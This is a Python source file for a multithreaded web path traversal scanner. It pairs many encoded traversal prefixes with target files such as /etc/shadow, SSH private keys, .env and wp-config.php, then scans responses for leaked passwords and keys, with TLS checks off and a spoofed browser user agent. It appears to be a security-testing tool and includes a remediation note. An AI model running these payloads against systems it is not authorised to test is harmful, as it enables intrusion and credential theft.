
import logging
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from urllib.parse import parse_qs, urlencode, urljoin, urlparse, urlunparse

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logger = logging.getLogger(__name__)

_WEB_TARGETS = [
    "etc/passwd",
    "windows/win.ini",
    ".env",
    "wp-config.php",
    "config.php",
    "web.config",
    "WEB-INF/web.xml",
    "etc/hosts",
    "windows/system32/drivers/etc/hosts",
    "boot.ini",
    "settings.py",
    "config/database.yml",
    "config/secrets.yml",
    ".htaccess",
    ".htpasswd",
    "phpinfo.php",
    "database.php",
    "WEB-INF/classes/application.properties",
    "app/config/parameters.yml",
    "application.properties",
    "etc/shadow",
    "etc/mysql/my.cnf",
    "etc/apache2/apache2.conf",
    "etc/nginx/nginx.conf",
    "proc/self/environ",
    "proc/self/cmdline",
    "proc/version",
    "var/log/apache2/access.log",
    "var/log/nginx/access.log",
    "root/.ssh/id_rsa",
    "root/.bash_history",
    "home/user/.ssh/id_rsa",
    "windows/system.ini",
    "windows/system32/config/SAM",
]

_TRAVERSAL_PREFIXES = [
    "../../../../../../../../",
    "../../../../../../",
    "../../../../",
    "../../",
    "../",
    "..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f",
    "..%2f..%2f..%2f..%2f..%2f..%2f",
    "..%2f..%2f..%2f..%2f",
    "..%2f..%2f",
    "..%2f",
    "..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252f",
    "..%252f..%252f..%252f..%252f",
    "..%252f",
    "..\\..\\..\\..\\..\\..\\..\\..\\",
    "..\\..\\..\\..\\",
    "..\\",
    "..%5c..%5c..%5c..%5c..%5c..%5c..%5c..%5c",
    "..%5c..%5c..%5c..%5c",
    "..%5c",
    "....//....//....//....//....//....//....//....//",
    "....//",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/",
    "%2e%2e/",
    "..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af..%c0%af",
    "..%c0%af",
    "..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f..%ef%bc%8f",
    "../%00",
]

_PAYLOADS = [prefix + t for prefix in _TRAVERSAL_PREFIXES for t in _WEB_TARGETS] + _WEB_TARGETS

_HIGH_SIGNAL_INDICATORS = [
    ("root:x:0:0", "Critical"),
    ("-----BEGIN RSA PRIVATE KEY-----", "Critical"),
    ("-----BEGIN OPENSSH PRIVATE KEY-----", "Critical"),
    ("APP_KEY=", "Critical"),
    ("DB_PASSWORD=", "Critical"),
    ("DATABASE_URL=", "Critical"),
    ("AWS_ACCESS_KEY", "Critical"),
    ("STRIPE_SECRET", "Critical"),
    ("SECRET_KEY=", "Critical"),
    ("<connectionStrings>", "Critical"),
    ("spring.datasource.password", "Critical"),
    ("AUTH_KEY", "High"),
    ("SECURE_AUTH_KEY", "High"),
    ("secret_key_base:", "High"),
    ("table_prefix", "High"),
    ("<web-app", "High"),
    ("<servlet-mapping", "High"),
    ("[boot loader]", "High"),
    ("[operating systems]", "High"),
    ("daemon:x:", "High"),
    ("/bin/bash", "High"),
    ("HOME=/", "High"),
    ("HOSTNAME=", "High"),
    ("RewriteEngine", "Medium"),
    ("Options -Indexes", "Medium"),
    ("AuthType", "Medium"),
    ("AuthUserFile", "Medium"),
    ("PHP Version", "Medium"),
    ("phpinfo()", "Medium"),
    ("<?php", "Medium"),
    ("define(", "Medium"),
    ("DATABASES = {", "Medium"),
    ("ALLOWED_HOSTS", "Medium"),
    ("adapter: mysql", "Medium"),
    ("adapter: postgresql", "Medium"),
    ("<appSettings>", "Medium"),
    ("<system.web>", "Medium"),
    ("[extensions]", "Low"),
    ("[fonts]", "Low"),
    ("[Mail]", "Low"),
]

_BLOCK_INDICATORS = [
    "access denied", "forbidden", "invalid path",
    "security alert", "not allowed", "illegal path",
    "path traversal", "attack detected",
]

_PATH_PARAM_NAMES = {
    "file", "path", "page", "dir", "folder", "doc", "document",
    "img", "image", "template", "view", "load", "resource", "include",
    "src", "source", "url", "uri", "filename", "name", "content",
    "module", "type", "action", "read", "fetch", "get", "ref",
    "cfg", "config", "data", "download", "attachment", "target",
    "dest", "destination", "open", "show", "redirect", "return",
}


def _check_response(text: str, status_code: int) -> tuple[str, str, str]:
    lower = text.lower()
    for indicator in _BLOCK_INDICATORS:
        if indicator in lower:
            return "BLOCKED", indicator, "Low"
    for indicator, severity in _HIGH_SIGNAL_INDICATORS:
        idx = lower.find(indicator.lower())
        if idx != -1:
            snippet = text[max(0, idx - 10): idx + len(indicator) + 80].strip()
            return "VULNERABLE", snippet[:250], severity
    return "SAFE", "", ""


class PathTraversalScanner:

    def __init__(self, timeout: int = 8, max_workers: int = 16):
        self.timeout = timeout
        self.max_workers = max_workers
        self._lock = threading.Lock()
        self._request_count = 0
        self._session = self._build_session()
        self._abort_scan = False

    def _build_session(self) -> requests.Session:
        s = requests.Session()
        s.verify = False
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=self.max_workers,
            pool_maxsize=self.max_workers * 2,
            max_retries=0,
        )
        s.mount("http://", adapter)
        s.mount("https://", adapter)
        s.headers.update({
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/124.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        })
        return s

    def scan(self, data: dict) -> dict:
        target = data.get("target", {})
        injectable_params = set(data.get("injectable_parameters", []))
        base_url = target.get("url", "")
        forms = target.get("forms", [])
        all_internal_links = target.get("all_internal_links", [])
        graph = target.get("graph", {"nodes": []})

        self._abort_scan = False

        logger.info("=" * 65)
        logger.info("PATH TRAVERSAL SCANNER — STARTING")
        logger.info(f"  Base URL  : {base_url}")
        logger.info(f"  Forms     : {len(forms)}")
        logger.info(f"  Int. Links: {len(all_internal_links)}")
        logger.info("=" * 65)

        tasks = self._build_tasks(base_url, forms, all_internal_links, graph, injectable_params)
        logger.info(f"  Total tasks: {len(tasks)}")

        results: list[dict] = []
        confirmed: set[tuple] = set()

        with ThreadPoolExecutor(max_workers=self.max_workers) as pool:
            futures = {pool.submit(self._test_task, t): t for t in tasks}
            for fut in as_completed(futures):
                try:
                    hit = fut.result()
                    if not hit:
                        continue
                    key = (hit["endpoint"], hit["parameter"])
                    with self._lock:
                        if key in confirmed:
                            continue
                        confirmed.add(key)
                        self._abort_scan = True
                    results.append(hit)
                except Exception as exc:
                    logger.debug(f"Worker error: {exc}")

        results.sort(key=lambda r: {"Critical": 0, "High": 1, "Medium": 2, "Low": 3}.get(r["severity"], 4))

        logger.info(f"PATH TRAVERSAL SCANNER COMPLETE — {len(results)} findings, {self._request_count} requests")
        return {
            "success": True,
            "engine": "path_traversal_scanner",
            "results": results,
            "total_requests": self._request_count,
        }

    def _build_tasks(self, base_url, forms, all_links, graph, injectable_params) -> list[dict]:
        tasks: list[dict] = []
        seen: set[tuple] = set()

        def add(url, param, method="get", mode="param"):
            key = (url, param, mode)
            if key not in seen:
                seen.add(key)
                tasks.append({"url": url, "param": param, "method": method.lower(), "mode": mode})

        for form in forms:
            action = urljoin(base_url, form.get("action") or base_url)
            method = (form.get("method") or "get").lower()
            for field in form.get("fields", []):
                name = (field.get("name") or "").strip()
                if not name:
                    continue
                if (field.get("type") or "").lower() in ("submit", "button", "image", "reset"):
                    continue
                if name.lower() in _PATH_PARAM_NAMES or name in injectable_params:
                    add(action, name, method, "param")

        candidate_urls: set[str] = set()
        if base_url:
            candidate_urls.add(base_url)
        for node in graph.get("nodes", []):
            nid = node.get("id", "") if isinstance(node, dict) else str(node)
            if nid:
                candidate_urls.add(nid)
        for link in all_links:
            if isinstance(link, str) and link:
                candidate_urls.add(link)

        for cu in candidate_urls:
            parsed = urlparse(cu)
            qs = parse_qs(parsed.query)
            base = urlunparse(parsed._replace(query="", fragment=""))
            for pname in qs:
                if pname.lower() in _PATH_PARAM_NAMES or pname in injectable_params:
                    add(base, pname, "get", "param")

        if base_url:
            for pname in injectable_params:
                if pname.lower() in _PATH_PARAM_NAMES:
                    add(base_url, pname, "get", "param")
            add(base_url, "__path__", "get", "path")

        return tasks

    def _test_task(self, task: dict) -> dict | None:
        url = task["url"]
        param = task["param"]
        method = task["method"]
        mode = task["mode"]

        baseline = self._get_baseline(url, method)

        for payload in _PAYLOADS:
            if self._abort_scan:
                return None
            try:
                if mode == "path":
                    test_url = self._build_path_url(url, payload)
                    resp = self._session.get(test_url, timeout=self.timeout, allow_redirects=True)
                else:
                    test_url, resp = self._send_param(url, param, method, payload)

                self._inc()

                if baseline and resp.status_code == baseline["status"] and resp.text == baseline["text"]:
                    continue

                status, evidence, severity = _check_response(resp.text, resp.status_code)

                if status == "VULNERABLE":
                    display_param = param if mode == "param" else "(path)"
                    self._abort_scan = True
                    return {
                        "vulnerable": True,
                        "type": "Path Traversal",
                        "severity": severity,
                        "endpoint": url,
                        "parameter": display_param,
                        "payload": payload,
                        "test_url": test_url,
                        "evidence": evidence,
                        "status_code": resp.status_code,
                        "method": method.upper(),
                        "mode": mode,
                        "description": (
                            f"Path traversal via {'parameter' if mode == 'param' else 'URL path'} "
                            f"'{display_param}' using payload: {payload}"
                        ),
                        "cwe": "CWE-22",
                        "owasp": "A01:2021 - Broken Access Control",
                        "recommendation": (
                            "Validate and sanitise all file path inputs. Use allowlists of permitted "
                            "paths, resolve canonical paths and verify they remain within the intended "
                            "directory, and avoid exposing raw filesystem access through web parameters."
                        ),
                    }

            except requests.exceptions.RequestException:
                continue
            except Exception as exc:
                logger.debug(f"Task error [{url}|{param}|{payload}]: {exc}")

        return None

    def _get_baseline(self, url: str, method: str) -> dict | None:
        try:
            if method == "post":
                resp = self._session.post(url, data={}, timeout=self.timeout, allow_redirects=True)
            else:
                resp = self._session.get(url, timeout=self.timeout, allow_redirects=True)
            self._inc()
            return {"status": resp.status_code, "text": resp.text}
        except Exception:
            return None

    def _send_param(self, url, param, method, payload) -> tuple[str, requests.Response]:
        parsed = urlparse(url)
        qs = parse_qs(parsed.query)
        qs[param] = [payload]
        test_url = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))
        if method == "post":
            resp = self._session.post(url, data={param: payload}, timeout=self.timeout, allow_redirects=True)
        else:
            resp = self._session.get(test_url, timeout=self.timeout, allow_redirects=True)
        return test_url, resp

    def _build_path_url(self, base_url: str, payload: str) -> str:
        parsed = urlparse(base_url)
        new_path = parsed.path.rstrip("/") + "/" + payload
        return urlunparse(parsed._replace(path=new_path, query="", fragment=""))

    def _inc(self, n: int = 1) -> None:
        with self._lock:
            self._request_count += n
